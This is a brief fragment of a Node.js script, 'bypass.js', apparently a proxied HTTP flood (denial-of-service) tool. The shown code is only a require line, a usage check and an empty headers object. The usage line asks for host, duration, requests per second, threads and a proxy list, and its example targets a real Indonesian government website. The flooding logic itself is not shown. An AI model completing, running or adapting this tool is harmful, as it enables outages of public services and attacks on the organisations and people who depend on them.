const net = require("net");
 ...
 if (process.argv.length < 7){console.log(gradient.vice(`[!] node bypass.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.
 EXAMPLE: node bypass.js https://dpr.go.id 500 100 70 proxy.txt`));; process.exit();}
 const headers = {};
